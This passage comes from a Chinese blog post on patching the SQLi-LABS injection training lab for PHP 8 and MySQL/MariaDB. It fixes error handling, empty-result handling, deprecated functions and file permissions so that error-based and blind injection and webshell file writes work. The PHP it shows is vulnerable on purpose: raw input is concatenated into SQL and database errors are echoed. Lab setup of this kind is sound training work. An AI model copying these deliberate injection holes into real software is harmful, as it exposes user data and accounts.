<kbd>0</kbd>，即不报错。将该语句注释后，程序正常报错（致命错误！）：<em>PHP Fatal error: Uncaught mysqli_sql_exception: …</em></p><img src="https://bu.dusays.com/2022/07/05/62c3e5aaebb15.webp" alt="" style="zoom:75%"><p>  该错误导致程序中断，后续代码将不能执行，但是，该段代码本身就是支持注入错误内容并回显错误信息的，因此，有理由怀疑是新版本的 PHP 导致程序中断。为此，笔者测试了 PHP 5.5.20、PHP 7.4.29、PHP 8.0.12、PHP 8.1.6 四种环境下的执行差异，结果如下图所示。</p><img src="https://bu.dusays.com/2022/07/05/62c3e5b01af6a.webp" alt="" style="zoom:75%"><p>  由测试结果可以看出，在 PHP 8.1.6 版本中，SQL 语句的语法错误被视为致命错误，程序会在此中断。而 PHP 8.0.12 版本中，则并不会视为错误，程序可以顺利执行。但是，却会在下一个函数 <kbd>mysqli_fetch_array()</kbd> 处报错，这是因为 <kbd>mysqli_query()</kbd> 函数执行错误语句且未报错的情况下会返回 <kbd>false</kbd>，而这作为 <kbd>bool</kbd> 类型的变量与 <kbd>mysqli_fetch_array()</kbd> 函数所需类型不符，从而引起致命错误。在 PHP 7.4.29 与 PHP 5.5.20 中，相同的问题则被视为警告，因此程序可以按照原有逻辑正常运行。实际上，这两点就涉及 PHP 8.0.x 与 PHP 8.1.x 的新特性：从 PHP 8.0 开始，尝试写入非对象属性（如 <kbd>false</kbd>）将会被视为错误异常，而从 PHP 8.1 开始，<kbd>MySQLi</kbd> 的默认错误处理模式由 <kbd>silent</kbd> 变成了 <kbd>exceptions</kbd>，即类似于上述语法错误将抛出异常处理而不是直接返回 <kbd>false</kbd>。关于这两点，依然可以在官方手册中对于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration80.incompatible.php">PHP 7.4.x 到 8.0.x</a> 以及 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/migration81.incompatible.php">PHP 8.0.x 到 8.1.x</a> 的不向后兼容的变更内容中找到：</p><img src="https://bu.dusays.com/2022/07/05/62c3e5ae9e2f2.webp" alt="" style="zoom:75%"></li><li><p>解决方案</p><p>  综上，我们需要解决两个问题，首先是 PHP 8.1 的默认错误处理模式问题，这一点官方手册中提供了方法，在错误部分之前使用语句 <kbd>mysqli_report(MYSQLI_REPORT_OFF);</kbd> 即可。然后便是 PHP 8.0 开始的异常问题，既然已经被列为致命错误了，那就不能直接无视了，要么将 PHP 版本修改为 8.0 以前的，要么就得老老实实处理错误异常。不提倡降级解决问题，因此这里选择处理错误异常。</p><p>  要处理这个异常，首先就得捕获这个异常，在之前测试时可以看到，错误提示为 <kbd>Uncaught TypeError...</kbd>，即错误类型为 <kbd>TypeError</kbd>。由此可以直接捕获 <kbd>TypeError</kbd> 类型，也可以捕获其基类。值得注意的是，正常用户级的异常都继承自 <kbd>Exception</kbd> 类，而 <kbd>TypeError</kbd> 则属于 PHP 内部错误，继承自 <kbd>Error</kbd> 类，若直接捕获 <kbd>Exception</kbd> 类异常将捕获失败进而导致处理无效。</p><p>  依然以 Less-1 的源码为例，修改如下，已省略部分无关代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ... 省略部分无关代码</span></span><br><span class="line">	mysqli_report(MYSQLI_REPORT_OFF);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ... 省略部分无关代码</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            print_r(mysqli_error(<span class="variable">$con</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  测试错误注入，回显成功，问题解决！</p><img src="https://bu.dusays.com/2022/07/05/62c3e5ab09cba.webp" alt="" style="zoom:75%"></li></ul><h4 id="空表处理问题">空表处理问题</h4><ul><li><p>问题描述</p><p>  在靶机原作者的设计中，查询失败并回显错误信息的操作并不仅限于 SQL 语句出现错误时，而同样适用于在查询结果为空时。现在的问题在于，在前述问题中将报错的触发条件设置为了 SQL 语句出错，而在结果集为空时则将导致程序正常执行，这也将直接导致后续布尔盲注无法进行！具体表现为在 <a href="#Less-5">Less-5</a> 及此类查询成功便显示固定字符的情况下，提交有效与无效值后都将看到同意结果，无法区分。</p><img src="https://bu.dusays.com/2022/09/04/6314b876bbeb2.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  出现这样的问题显然已经不能通过修改环境来解决了，毕竟这是属于笔者擅自修改原靶机的处理机制且未考虑周全导致的。解决这个问题的思路自然就是如何将空表的处理融入进前文中的错误处理机制中，总不能直接复制代码做分别两次处理吧，<psw>虽然这样是挺方便的</psw>。</p></li><li><p>解决方案</p><p>  解决这个问题还是比较简单的，添加下面这一行代码即可，表示当结果集为空时，抛出一个 <kbd>TypeError</kbd> 异常，这样就能与前文中的错误处理结合了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$row</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>  观察源代码可以知道，结果集应该储存于变量 <kbd>&#36;result</kbd> 中，但是这里却对结果集数组化后的变量 <kbd>&#36;row</kbd> 进行判断。按理来说直接对变量 <kbd>&#36;result</kbd> 进行判断更加准确且还能省去对空表数组化操作的步骤，<psw>起初我就是这么干的</psw>。但很遗憾，结果集在数组中的存放并不只是数据内容而已，因此空表并不代表变量 <kbd>&#36;result</kbd> 也为空，事实上储存空表的变量长这样：</p><img src="https://bu.dusays.com/2022/09/04/6314b86d4ef13.webp" alt="" style="zoom:75%"><p>  总的来说就是在无意重构程序的情况下切记随意篡改别人的代码，<psw>自己的最好也不要</psw>，就算进行必要的修改也应尽量还原代码构造，<psw>笔者头脑发热对全部文件统一错误修改后血的教训</psw>。</p><p>  依然以 Less-1 的源码为例，修改如下，已省略部分无关代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ... 省略部分无关代码</span></span><br><span class="line">	mysqli_report(MYSQLI_REPORT_OFF);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ... 省略部分无关代码</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$row</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">            print_r(mysqli_error(<span class="variable">$con</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="更新残留问题">更新残留问题</h4><ul><li><p>问题描述</p><p>  在 <a href="#Less-17">Less-17</a> 中代码出现重大变化，在完成前述修正之后，依然出现对于任何输入均返回服务器 <kbd>500</kbd> 错误码的问题。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc676f5c.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">mysqli_report(MYSQLI_REPORT_OFF);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysqli_real_escape_string(<span class="variable">$con</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$row</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span></span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span></span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		mysql_query(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (mysqli_error(<span class="variable">$con</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			print_r(mysqli_error(<span class="variable">$con</span>));</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;	</span><br><span class="line">		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span></span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  	&#125; <span class="keyword">catch</span> (<span class="built_in">TypeError</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">		<span class="comment">//echo &quot;Bug off you Silly Dumb hacker&quot;;</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  首先当然还是查看源码，可以看到增加了许多代码，因为本关增加了对于参数的过滤，主要通过将引号转义来使 SQL 注入无效。</p><p>  将源码置于本地调试，一粘贴便报错了，报错点在 <kbd>get_magic_quotes_gpc()</kbd> 函数，该函数用于获取 <kbd>magic_quotes_gpc</kbd> 配置选项的值，而该配置开启时便会自动将普通数据（<kbd>Get/Post/Cookie</kbd>）的单双引号、反斜杠与 NULL 转义。然而 <kbd>get_magic_quotes_gpc()</kbd> 函数在 PHP 7.4.0 起便被废弃，配置选项 <kbd>magic_quotes_gpc</kbd> 更是在 PHP 5.4.0 起就被删除。也就是说，PHP 将安全编码留给了用户自己而非对该配置项的依赖，解析器不再自动添加转义符号。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc662563.webp" alt="" style="zoom:75%"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  那么就该对于该 <kbd>if</kbd> 语句进行审计并更新了，程序在确认配置项开启后便会执行 <kbd>stripslashes()</kbd> 函数，该函数实际上就是将前述配置中自动添加的转义字符删除，恢复数据原来的样子。显然，在该配置项都不存在的现代，整个 <kbd>if</kbd> 语句都显得十分多余，因此直接删去即可。</p><p>  很遗憾，报错依然存在，报错点位于下一个 <kbd>if</kbd> 语句中的 <kbd>mysqli_real_escape_string()</kbd> 函数中，该函数可以检测并转义特殊字符，其中就包括在 SQL 注入中极其重要的单双引号。不过报错与该函数并无关系，错误的是该函数的第一个参数 <kbd>&#36;con</kbd>。</p><p>  这里就涉及到 PHP 中全局变量的作用域问题，与其他许多语言不太一样的是，在 PHP 的函数中要访问全局变量需要先在函数内使用关键字 <kbd>global</kbd> 对全局变量进行声明或者使用特殊的 PHP 自定义 <kbd>&#36;GOLBALS</kbd> 数组对全局变量进行访问。更加详细可参考 <a target="_blank" rel="noopener" href="https://www.php.net/language.variables.scope">官方文档</a>。因此对于该错误可进行如下两种修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$con</span>;</span><br><span class="line">    <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysqli_real_escape_string(<span class="variable">$con</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;con&#x27;</span>], <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  已经发现两个问题了，但是很遗憾，在某个角落依然<strong>顺便</strong>发现了个错误，程序在执行更新的 SQL 语句时调用的竟然是 <kbd>mysql_query()</kbd> 函数，该函数在 PHP 7.0.0 后便被废弃。以往对于 <kbd>SQLi-LABS</kbd> 的更新迭代都会强调该函数的更新，即更换为 <kbd>mysqli_query()</kbd> 函数，此处应该是本版修改者失误遗漏造成的，这里一并修改了。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc661f56.webp" alt="" style="zoom:75%"></li><li><p>解决方案</p><p>  将 <kbd>get_magic_quotes_gpc()</kbd> 函数所在的整个 <kbd>if</kbd> 语句注释，<psw>毕竟是修改人家的代码，能注释的原则上还是不做删除处理</psw>。关于作用域方面的问题，为便于修改，笔者统一采用 <kbd>&#36;GOLBALS</kbd> 数组进行修改。对于 <kbd>mysql_query(&#36;update)</kbd> 函数则更改为 <kbd>mysqli_query(&#36;con,&#36;update)</kbd> 即可，值得注意的是修改后的函数需要两个参数。</p><p>  相类似的问题后续还有一些，解决方案均如上即可。</p></li></ul><h4 id="权限问题（MySQL）">权限问题（MySQL）</h4><ul><li><p>问题描述</p><p>  在利用注入对文件进行操作时（如 <a href="#Less-7">Less-7</a>），确定 <kbd>payload</kbd> <strong>正确</strong>但是页面返回错误，查看文件夹也并无相应木马文件生成。</p><img src="https://bu.dusays.com/2022/08/17/62fc5f69ebffc.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  由于该题不返回具体错误信息，因此先修改程序，使其显示具体的报错信息。由于源代码中对于报错信息显示的部分代码有所保留，因此直接取消该部分注释即可，完成后执行结果如图，显示信息为：<em>Can't create/write to file …</em></p><img src="https://bu.dusays.com/2022/08/17/62fc5f69f21ab.webp" alt="" style="zoom:75%"><p>  由上述信息基本可以确认是权限问题，在处理 PHP 程序中文件操作权限不足时，笔者赋予了用户群组 <kbd>www-data</kbd> 对于整个靶机的读写权限，参照这个思路，只需另外再赋予 MySQL 的执行用户读写权限即可，其中 MySQL 默认使用的用户为 <kbd>mysql</kbd>。一个简单的做法依然是赋予所有用户读写权限，但是本着不让权力被滥用的原则，优先考虑为特定用户赋权。当前靶机的权限情况如下图所示，可以看出没办法为 <kbd>mysql</kbd> 用户单独赋权了。</p><img src="https://bu.dusays.com/2022/08/17/62fc5f6ae945d.webp" alt="" style="zoom:75%"><p>  不过，靶机的所有者还可以通过命令修改，由于 <kbd>root</kbd> 用户本来就具有所有权，因此所有者完全可以设置为其他用户。既然靶机是在网页提供服务的，这里就把所有者设为 <kbd>Apache</kbd> 的执行用户 <kbd>www-data</kbd>，此外再为 <kbd>mysql</kbd> 用户赋予读写权限即可。</p></li><li><p>解决方案</p><p>  对文件所有者的修改无法在图形界面直接完成，而要借助如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown www-data sqli-labs -R</span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/08/17/62fc5fcb0afdb.webp" alt="" style="zoom:75%"><p>  其中，<kbd>-R</kbd> 表示递归执行，即 <kbd>sqli-labs</kbd> 以及所有子文件的所有者均设为 <kbd>www-data</kbd>。后续完成对 <kbd>mysql</kbd> 用户的赋权即可，完成后的权限情况如下图所示：</p><img src="https://bu.dusays.com/2022/08/17/62fc5f6b1a09a.webp" alt="" style="zoom:75%"><div class="tip warning faa-horizontal animated-hover"><p>操作完成后其实依然会返回错误，但是木马文件的创建确实已经完成，这就足够了。经过进一步验证，对应 SQL 语句执行成功，但是存在一个警告：</p><img src="https://bu.dusays.com/2022/08/17/62fc5fecc638e.webp" alt="" style="zoom:75%"></div></li></ul><h4 id="MariaDB-问题">MariaDB 问题</h4><ul><li><p>问题描述</p><p>  在 <a href="#Less-7">Less-7</a> 中验证全局变量 <kbd>secure_file_priv</kbd> 值时遇到了问题，如图所示，虽然确定变量值为空，但是值的长度却不等于零，因而造成查询失败：</p><img src="https://bu.dusays.com/2022/09/04/6314b86d51f20.webp" alt="" style="zoom:75%"></li><li><p>研究过程</p><p>  直接在靶机中使用命令行操作 MySQL 验证，确认变量值确实为空，结果如图。</p><img src="https://bu.dusays.com/2022/09/04/6314b870e4b96.webp" alt="" style="zoom:75%"><p>  然后获取变量值的长度，验证长度为零。结果如图，很遗憾，长度并不为零，而是 <kbd>NULL</kbd>。</p><img src="https://bu.dusays.com/2022/09/04/6314b87163e9f.webp" alt="" style="zoom:75%"><p>  上述两个结果显然发生了冲突，因为空值的长度应该返回零才对。再次查询变量值，这次使用 <kbd>select</kbd> 语句，若变量值依然为空则确定是 <kbd>length()</kbd> 